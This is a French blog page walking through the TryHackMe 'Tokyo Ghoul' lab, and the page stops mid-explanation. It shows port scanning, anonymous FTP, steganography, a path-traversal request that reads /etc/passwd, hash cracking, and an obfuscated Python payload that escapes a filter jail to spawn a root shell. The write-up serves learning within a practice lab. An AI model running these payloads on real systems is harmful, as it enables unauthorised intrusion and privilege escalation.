<!DOCTYPE html>
<html lang="fr-fr" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Tokyo Ghoul# Introduction# Voici la description de la Room : ‘‘‘ This room took a lot of inspiration from psychobreak , and it is based on Tokyo Ghoul anime. Alert: This room can contain some spoilers ‘only s1 and s2 ’ so if you are interested to watch the anime, wait till you finish the anime and come back to do the room The machine will take some time, just go grab some water or make a coffee. ‘‘‘
">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/tryhackme/collapsed/tokyog/">
  <meta property="og:site_name" content="Blog de @camillegr">
  <meta property="og:title" content="Tokyo Ghoul">
  <meta property="og:description" content="Tokyo Ghoul# Introduction# Voici la description de la Room : ‘‘‘ This room took a lot of inspiration from psychobreak , and it is based on Tokyo Ghoul anime. Alert: This room can contain some spoilers ‘only s1 and s2 ’ so if you are interested to watch the anime, wait till you finish the anime and come back to do the room The machine will take some time, just go grab some water or make a coffee. ‘‘‘">
  <meta property="og:locale" content="fr_fr">
  <meta property="og:type" content="article">
    <meta property="article:section" content="docs">


  <meta itemprop="name" content="Tokyo Ghoul">
  <meta itemprop="description" content="Tokyo Ghoul# Introduction# Voici la description de la Room : ‘‘‘ This room took a lot of inspiration from psychobreak , and it is based on Tokyo Ghoul anime. Alert: This room can contain some spoilers ‘only s1 and s2 ’ so if you are interested to watch the anime, wait till you finish the anime and come back to do the room The machine will take some time, just go grab some water or make a coffee. ‘‘‘">
  <meta itemprop="wordCount" content="790">

<title>Tokyo Ghoul | Blog de @camillegr</title>
<link rel="icon" href="/favicon.png" >
<link rel="manifest" href="/manifest.json">
<link rel="canonical" href="http://localhost:1313/docs/tryhackme/collapsed/tokyog/">
<link rel="stylesheet" href="/book.min.8be08ee19c78fece5778ccbad7b7920c47943153ee0c9e856094873c56dca415.css" integrity="sha256-i&#43;CO4Zx4/s5XeMy617eSDEeUMVPuDJ6FYJSHPFbcpBU=" crossorigin="anonymous">


  <script defer src="/fuse.min.js"></script>
  <script defer src="/en.search.min.aa3e45dc883265ddd9a1ef8c539caf21b27fd3b7d511e89e355c0164359a2193.js" integrity="sha256-qj5F3IgyZd3Zoe&#43;MU5yvIbJ/07fVEeieNVwBZDWaIZM=" crossorigin="anonymous"></script>



  
</head>
<body dir="ltr" class="book-kind-page book-type-docs">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    
<aside class="book-menu">
  <div class="book-menu-content">
    
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><span>Blog de @camillegr</span>
  </a>
</h2>


<div class="book-search hidden">
  <input id="book-search-input" type="text" 
    placeholder="Search"
    aria-label="Search"
    maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>
<script>document.querySelector(".book-search").classList.remove("hidden")</script>













  
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-a1af4a996fb1fd454470e4444972e4f9" class="toggle"  />
    <label for="section-a1af4a996fb1fd454470e4444972e4f9" class="flex">
      <a href="/docs/ctf/" class="">
        CTF</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-f3561ec6727758028b3a2ef314dd5169" class="toggle"  />
    <label for="section-f3561ec6727758028b3a2ef314dd5169" class="flex">
      <a href="/docs/ctf/rootmepro2025/" class="">
        CTF 2025 | Root-Me Pro x DGSE</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission1/" class="">
      Mission 1 - IA</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission2/" class="">
      Mission 2 - SOC</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission3/" class="">
      Mission 3 - Forensic</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission4/" class="">
      Mission 4 - Pentest</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission5/" class="">
      Mission 5 - Mobile</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission6/" class="">
      Mission 6 - OSINT</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-ba5e9fca78bb6e1afcafc6aba970bb3e" class="toggle"  />
    <label for="section-ba5e9fca78bb6e1afcafc6aba970bb3e" class="flex">
      <a role="button" class="">
        Projets Personnels</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/projets/collapsed/tofuzz/" class="">
      ToFuzz</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-c65aa4e708b6bdd64019a9cd49da31df" class="toggle" checked />
    <label for="section-c65aa4e708b6bdd64019a9cd49da31df" class="flex">
      <a href="/docs/tryhackme/" class="">
        TryHackMe</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/hammer/" class="">
      Hammer</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/mrrobot/" class="">
      Mr Robot</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/rootme/" class="">
      RootMe</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/tokyog/" class="active">
      Tokyo Ghoul</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/wonderlands/" class="">
      Wonderlands</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <a>
      Divers</a>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/divers/blogs/" class="">
      Blogs</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>













</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>



  </div>
</aside>
 

    <div class="book-page">
      <header class="book-header hidden">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <h3>Tokyo Ghoul</h3>

  <label for="toc-control">
    
    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#tokyo-ghoul">Tokyo Ghoul</a>
      <ul>
        <li><a href="#introduction"><strong>Introduction</strong></a></li>
        <li><a href="#reconnaissance-et-énumération-des-services">Reconnaissance et énumération des services</a>
          <ul>
            <li><a href="#scan-de-ports-avec-nmap">Scan de ports avec Nmap</a></li>
          </ul>
        </li>
        <li><a href="#exploitation-du-service-ftp">Exploitation du service FTP</a>
          <ul>
            <li><a href="#récupération-du-binaire-need_to_talk">Récupération du binaire <code>need_to_talk</code></a></li>
          </ul>
        </li>
        <li><a href="#stéganographie-et-cryptographie">Stéganographie et cryptographie</a>
          <ul>
            <li><a href="#extraction-de-données-cachées-dans-une-image">Extraction de données cachées dans une image</a></li>
            <li><a href="#déchiffrement-du-code-morse">Déchiffrement du code Morse</a></li>
          </ul>
        </li>
        <li><a href="#énumération-du-service-http">Énumération du service HTTP</a>
          <ul>
            <li><a href="#recherche-de-répertoires-cachés-avec-gobuster">Recherche de répertoires cachés avec Gobuster</a></li>
            <li><a href="#exploitation-dune-faille-lfi-cwe-98">Exploitation d’une faille LFI (CWE-98)</a></li>
          </ul>
        </li>
        <li><a href="#cracking-du-mot-de-passe-de-lutilisateur-kamishiro">Cracking du mot de passe de l’utilisateur <code>kamishiro</code></a>
          <ul>
            <li><a href="#utilisation-de-john-the-ripper">Utilisation de John the Ripper</a></li>
          </ul>
        </li>
        <li><a href="#post-exploitation">Post-Exploitation</a>
          <ul>
            <li><a href="#connexion-en-tant-que-kamishiro">Connexion en tant que <code>kamishiro</code></a></li>
            <li><a href="#vérification-des-droits-sudo">Vérification des droits sudo</a></li>
          </ul>
        </li>
        <li><a href="#escalade-de-privilège">Escalade de Privilège</a>
          <ul>
            <li><a href="#analyse-du-script">Analyse du script</a></li>
            <li><a href="#contournement-des-restrictions">Contournement des restrictions</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown book-article"><h1 id="tokyo-ghoul">Tokyo Ghoul<a class="anchor" href="#tokyo-ghoul">#</a></h1>
<h2 id="introduction"><strong>Introduction</strong><a class="anchor" href="#introduction">#</a></h2>
<p>Voici la description de la Room :
‘‘‘
This room took a lot of inspiration from psychobreak , and it is based on Tokyo Ghoul anime.
Alert: This room can contain some spoilers &lsquo;only s1 and s2 &rsquo; so if you are interested to watch the anime, wait till you finish the anime and come back to do the room
The machine will take some time, just go grab some water or make a coffee.
‘‘‘</p>
<h2 id="reconnaissance-et-énumération-des-services">Reconnaissance et énumération des services<a class="anchor" href="#reconnaissance-et-%c3%a9num%c3%a9ration-des-services">#</a></h2>
<h3 id="scan-de-ports-avec-nmap">Scan de ports avec Nmap<a class="anchor" href="#scan-de-ports-avec-nmap">#</a></h3>
<p>Un scan complet des ports ouverts a été réalisé pour identifier les services exposés :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sS -sV -p- -T5 10.80.161.195
</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff6ac1">(</span> https://nmap.org <span style="color:#ff6ac1">)</span> at 2026-01-14 17:07 GMT
</span></span><span style="display:flex;"><span>mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
</span></span><span style="display:flex;"><span>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff6ac1">for</span> 10.80.161.195
</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff6ac1">(</span>0.00012s latency<span style="color:#ff6ac1">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ff9f43">65532</span> closed ports
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>21/tcp open  ftp     vsftpd 3.0.3
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span style="color:#ff6ac1">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.18 <span style="color:#ff6ac1">((</span>Ubuntu<span style="color:#ff6ac1">))</span>
</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff6ac1">done</span>: <span style="color:#ff9f43">1</span> IP address <span style="color:#ff6ac1">(</span><span style="color:#ff9f43">1</span> host up<span style="color:#ff6ac1">)</span> scanned in 9.19 seconds</span></span></code></pre></div><ul>
<li>Le service FTP pourrait contenir des fichiers sensibles. La version est certainement faillible avec un utilisateur <code>anonymous</code></li>
<li>Le service HTTP mérite une énumération plus poussée (répertoires, fichiers cachés).</li>
</ul>
<hr>
<h2 id="exploitation-du-service-ftp">Exploitation du service FTP<a class="anchor" href="#exploitation-du-service-ftp">#</a></h2>
<p>Il est effectivement possible de se connecter avec l&rsquo;utilisateur anonymous et sans mot de passe.</p>
<h3 id="récupération-du-binaire-need_to_talk">Récupération du binaire <code>need_to_talk</code><a class="anchor" href="#r%c3%a9cup%c3%a9ration-du-binaire-need_to_talk">#</a></h3>
<p>Un binaire nommé <code>need_to_talk</code> peut être récupéré depuis le serveur FTP. Ce binaire demande un mot de passe. Si on utilise un programme comme <code>strings</code> ou <code>rabin2</code> on peut trouver des informations :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rabin2 -z need_to_talk 
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>Strings<span style="color:#ff6ac1">]</span>
</span></span><span style="display:flex;"><span>nth paddr      vaddr      len size section <span style="color:#ff5c57">type</span>  string
</span></span><span style="display:flex;"><span><span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span>2015<span style="color:#5af78e">\u</span><span style="color:#ff9f43">2015</span>
</span></span><span style="display:flex;"><span><span style="color:#ff9f43">0</span>   0x00002008 0x00002008 <span style="color:#ff9f43">9</span>   <span style="color:#ff9f43">10</span>   .rodata ascii kamishiro
</span></span><span style="display:flex;"><span><span style="color:#ff9f43">1</span>   0x00002018 0x00002018 <span style="color:#ff9f43">37</span>  <span style="color:#ff9f43">38</span>   .rodata ascii Hey Kaneki finnaly you want to talk <span style="color:#5af78e">\n</span>
</span></span><span style="display:flex;"><span><span style="color:#ff9f43">2</span>   0x00002040 0x00002040 <span style="color:#ff9f43">82</span>  <span style="color:#ff9f43">83</span>   .rodata ascii Unfortunately before I can give you the kagune you need to give me the paraphrase<span style="color:#5af78e">\n</span>
</span></span><span style="display:flex;"><span><span style="color:#ff9f43">3</span>   0x00002098 0x00002098 <span style="color:#ff9f43">35</span>  <span style="color:#ff9f43">36</span>   .rodata ascii Do you have what I<span style="color:#5af78e">&#39;m looking for?\n\n
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">4   0x000020c0 0x000020c0 47  48   .rodata ascii Good job. I believe this is what you came for:\n
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">5   0x000020f0 0x000020f0 51  52   .rodata ascii Hmm. I don&#39;</span>t think this is what I was looking <span style="color:#ff6ac1">for</span>.<span style="color:#5af78e">\n</span>
</span></span><span style="display:flex;"><span><span style="color:#ff9f43">6</span>   0x00002128 0x00002128 <span style="color:#ff9f43">36</span>  <span style="color:#ff9f43">37</span>   .rodata ascii Take a look inside of me. rabin2 -z<span style="color:#5af78e">\n</span></span></span></code></pre></div><p>On peut donc essayer le mot de passe kamishiro qui pourrait être une variable définit au début du binaire. Celui-ci nous donne une clé.</p>
<h2 id="stéganographie-et-cryptographie">Stéganographie et cryptographie<a class="anchor" href="#st%c3%a9ganographie-et-cryptographie">#</a></h2>
<h3 id="extraction-de-données-cachées-dans-une-image">Extraction de données cachées dans une image<a class="anchor" href="#extraction-de-donn%c3%a9es-cach%c3%a9es-dans-une-image">#</a></h3>
<p>Une image (<code>You_found_1t.jpg</code>) a été analysée avec <code>steghide</code> :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>steghide extract -sf You_found_1t.jpg</span></span></code></pre></div><p><strong>Mot de passe :</strong> <code>You_found_1t</code>
<strong>Fichier extrait :</strong> <code>yougotme.txt</code> (contenant du code Morse).</p>
<h3 id="déchiffrement-du-code-morse">Déchiffrement du code Morse<a class="anchor" href="#d%c3%a9chiffrement-du-code-morse">#</a></h3>
<p>Le contenu de <code>yougotme.txt</code> peut être facilement déchiffre avec cyberchef, révélant un nouveau mot de passe ou un indice pour la suite de l’exploitation.</p>
<p><img src="../img/tokyog.png" alt="Déchiffrement de Yougotme" /></p>
<hr>
<h2 id="énumération-du-service-http">Énumération du service HTTP<a class="anchor" href="#%c3%a9num%c3%a9ration-du-service-http">#</a></h2>
<h3 id="recherche-de-répertoires-cachés-avec-gobuster">Recherche de répertoires cachés avec Gobuster<a class="anchor" href="#recherche-de-r%c3%a9pertoires-cach%c3%a9s-avec-gobuster">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.80.161.195/d1r3c70ry_center -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,conf</span></span></code></pre></div><p>On peut identifier un répertoire <code>/claim</code>.</p>
<h3 id="exploitation-dune-faille-lfi-cwe-98">Exploitation d’une faille LFI (CWE-98)<a class="anchor" href="#exploitation-dune-faille-lfi-cwe-98">#</a></h3>
<p>Le répertoire <code>/claim</code> contient une vulnérabilité LFI, permettant de lire des fichiers système :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>url http://10.80.161.195/d1r3c70ry_center/claim/index.php?view<span style="color:#ff6ac1">=</span>%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
</span></span><span style="display:flex;"><span>&lt;html&gt;
</span></span><span style="display:flex;"><span>    &lt;head&gt;
</span></span><span style="display:flex;"><span>	&lt;link <span style="color:#ff5c57">href</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;https://fonts.googleapis.com/css?family=IBM+Plex+Sans&#34;</span> <span style="color:#ff5c57">rel</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;stylesheet&#34;</span>&gt; 
</span></span><span style="display:flex;"><span>	&lt;link <span style="color:#ff5c57">rel</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;stylesheet&#34;</span> <span style="color:#ff5c57">type</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;text/css&#34;</span> <span style="color:#ff5c57">href</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;style.css&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;/head&gt;
</span></span><span style="display:flex;"><span>    &lt;body&gt;
</span></span><span style="display:flex;"><span>	&lt;div <span style="color:#ff5c57">class</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;menu&#34;</span>&gt;
</span></span><span style="display:flex;"><span>	    &lt;a <span style="color:#ff5c57">href</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;index.php&#34;</span>&gt;Main Page&lt;/a&gt;
</span></span><span style="display:flex;"><span>	    &lt;a <span style="color:#ff5c57">href</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;index.php?view=flower.gif&#34;</span>&gt;NO&lt;/a&gt;
</span></span><span style="display:flex;"><span>	    &lt;a <span style="color:#ff5c57">href</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;index.php?view=flower.gif&#34;</span>&gt;YES&lt;/a&gt;
</span></span><span style="display:flex;"><span>	&lt;/div&gt;
</span></span><span style="display:flex;"><span>&lt;p&gt;root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#ff6ac1">(</span>admin<span style="color:#ff6ac1">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
</span></span><span style="display:flex;"><span>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
</span></span><span style="display:flex;"><span>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
</span></span><span style="display:flex;"><span>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
</span></span><span style="display:flex;"><span>syslog:x:104:108::/home/syslog:/bin/false
</span></span><span style="display:flex;"><span>_apt:x:105:65534::/nonexistent:/bin/false
</span></span><span style="display:flex;"><span>lxd:x:106:65534::/var/lib/lxd/:/bin/false
</span></span><span style="display:flex;"><span>messagebus:x:107:111::/var/run/dbus:/bin/false
</span></span><span style="display:flex;"><span>uuidd:x:108:112::/run/uuidd:/bin/false
</span></span><span style="display:flex;"><span>dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
</span></span><span style="display:flex;"><span>statd:x:110:65534::/var/lib/nfs:/bin/false
</span></span><span style="display:flex;"><span>sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash
</span></span><span style="display:flex;"><span>vboxadd:x:999:1::/var/run/vboxadd:/bin/false
</span></span><span style="display:flex;"><span>ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
</span></span><span style="display:flex;"><span>kamishiro:<span style="color:#ff5c57">$6$Tb</span>/euwmK<span style="color:#ff5c57">$OXA</span>.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash
</span></span><span style="display:flex;"><span>&lt;/p&gt;    &lt;/body&gt;
</span></span><span style="display:flex;"><span>&lt;/html&gt;</span></span></code></pre></div><p>On récupère donc <code>/etc/passwd</code> qui révèle l'utilisateur <code>kamishiro</code> et le hash de son mot de passe.</p>
<hr>
<h2 id="cracking-du-mot-de-passe-de-lutilisateur-kamishiro">Cracking du mot de passe de l’utilisateur <code>kamishiro</code><a class="anchor" href="#cracking-du-mot-de-passe-de-lutilisateur-kamishiro">#</a></h2>
<h3 id="utilisation-de-john-the-ripper">Utilisation de John the Ripper<a class="anchor" href="#utilisation-de-john-the-ripper">#</a></h3>
<p>Le hash du mot de passe de <code>kamishiro</code> a été extrait de <code>/etc/shadow</code> et cracké avec <code>rockyou.txt</code> :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john kamishiro --wordlist<span style="color:#ff6ac1">=</span>/usr/share/wordlists/rockyou.txt</span></span></code></pre></div><p>Mot de passe trouvé : <code>password123</code>.</p>
<hr>
<h2 id="post-exploitation">Post-Exploitation<a class="anchor" href="#post-exploitation">#</a></h2>
<h3 id="connexion-en-tant-que-kamishiro">Connexion en tant que <code>kamishiro</code><a class="anchor" href="#connexion-en-tant-que-kamishiro">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh kamishiro@10.80.161.195</span></span></code></pre></div><p><strong>Mot de passe :</strong> <code>password123</code></p>
<h3 id="vérification-des-droits-sudo">Vérification des droits sudo<a class="anchor" href="#v%c3%a9rification-des-droits-sudo">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l</span></span></code></pre></div><ul>
<li>L’utilisateur <code>kamishiro</code> peut exécuter <code>/usr/bin/python3 /home/kamishiro/jail.py</code> en tant que <strong>root</strong>.</li>
</ul>
<hr>
<h2 id="escalade-de-privilège">Escalade de Privilège<a class="anchor" href="#escalade-de-privil%c3%a8ge">#</a></h2>
<h3 id="analyse-du-script">Analyse du script<a class="anchor" href="#analyse-du-script">#</a></h3>
<p>Le script <code>jail.py</code> filtre certains mots-clés (<code>eval</code>, <code>exec</code>, <code>import</code>, etc.) mais permet l’exécution de code Python via <code>exec(text)</code>.</p>
<h3 id="contournement-des-restrictions">Contournement des restrictions<a class="anchor" href="#contournement-des-restrictions">#</a></h3>
<p>On construit un payload en obfusquant notre code pour exécuter <code>/bin/bash</code> en tant que root :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__builtins__<span style="color:#ff6ac1">.</span><span style="color:#ff5c57">__dict__</span>[<span style="color:#ff5c57">chr</span>(<span style="color:#ff9f43">95</span>)<span style="color:#ff6ac1">+</span><span style="color:#ff5c57">chr</span>(<span style="color:#ff9f43">95</span>)<span style="color:#ff6ac1">+</span><span style="color:#5af78e">&#39;impo&#39;</span><span style="color:#ff6ac1">+</span><span style="color:#5af78e">&#39;rt&#39;</span><span style="color:#ff6ac1">+</span><span style="color:#ff5c57">chr</span>(<span style="color:#ff9f43">95</span>)<span style="color:#ff6ac1">+</span><span style="color:#ff5c57">chr</span>(<span style="color:#ff9f43">95</span>)](<span style="color:#5af78e">&#39;o&#39;</span><span style="color:#ff6ac1">+</span><span style="color:#5af78e">&#39;s&#39;</span>)<span style="color:#ff6ac1">.</span><span style="color:#ff5c57">__dict__</span>[<span style="color:#5af78e">&#39;sy&#39;</span><span style="color:#ff6ac1">+</span><span style="color:#5af78e">&#39;stem&#39;</span>](<span style="color:#5af78e">&#39;/bin/bash&#39;</span>)</span></span></code></pre></div><p><strong>Explication :</strong></p>
<ul>
<li><code>chr(95)</code> équivaut à <code>_</code>, donc <code>chr(95)+chr(95)+'impo'+'rt'+chr(95)+chr(95)</code> → <code>__import__</code>.</li>
